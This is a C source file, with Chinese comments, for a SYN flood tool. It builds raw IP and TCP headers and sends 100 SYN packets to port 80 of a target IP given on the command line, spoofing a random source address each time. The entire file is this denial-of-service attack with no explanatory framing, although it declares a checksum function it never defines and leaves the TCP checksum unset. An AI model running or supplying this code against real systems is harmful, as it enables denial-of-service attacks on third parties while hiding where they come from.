#include <sys/socket.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#define DESTPORT 80
#define LOCALPORT 8888

void send_tcp(int sock, struct sockaddr_in *addr);
unsigned short check_sum(unsigned short	*addr, int len);

int main(int argc, char *argv[])
{
    int sockfd;
    struct sockaddr_in addr;
    int on = 1;
    if(argc != 2)
    {
	fprintf(stderr, "Usage: %s Ip\n", argv[0]);
	exit(1);
    }

    bzero(&addr, sizeof(struct sockaddr_in));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(DESTPORT);
    inet_aton(argv[1], &addr.sin_addr);

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); 
    if(sockfd < 0) {
	perror("socket error");
	exit(1);
    }

    setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
    setuid(getuid());
    send_tcp(sockfd, &addr);
    return 0;
}

void send_tcp(int sock, struct sockaddr_in *addr)
{
    char buffer[100];
    struct ip *ip;
    struct tcphdr *tcp;
    int head_len;

    head_len = sizeof(struct ip) + sizeof(struct tcphdr);
    
    bzero(buffer, 100);

    ip = (struct ip*)buffer;
    /* 设置ip数据包的包头 */
    ip->ip_v = IPVERSION; /* 设置ip版本 */
    ip->ip_hl = sizeof(struct ip) >> 2; /* ip数据包头的长度 */
    ip->ip_tos = 0; /* 服务类型 */
    ip->ip_len = htons(head_len); /* ip数据包的长度 */
    ip->ip_id = 0; /* 内核自动填写 */
    ip->ip_off = 0; /* 内核自动填写 */
    ip->ip_ttl = MAXTTL; /* 最长存活时间 */
    ip->ip_p = IPPROTO_TCP; /* TCP */
    ip->ip_sum = 0; /* 内核自动计算校验和 */
    ip->ip_dst = addr->sin_addr; /* 目的ip */
    printf("dest address is %s\n", inet_ntoa(addr->sin_addr));

    /* tcp的内容 */
    tcp = (struct tcphdr*) (buffer + sizeof(struct ip));
    tcp->source = htons(LOCALPORT); /* 源端口 */
    tcp->dest = addr->sin_port; /* 目的端口 */
    tcp->seq = random(); /* */
    tcp->ack_seq = 0;
    tcp->doff = 5;
    tcp->syn = 1; /* 建立连接 */
    tcp->check = 0;

    int i = 100;
    while(i--) {
	ip->ip_src.s_addr = random(); /* 随机源ip */
	printf("src addr is %s\n", inet_ntoa(ip->ip_src));
	sendto(sock, buffer, head_len, 0, (struct sockaddr *)addr, sizeof(struct sockaddr)); 
    }
}
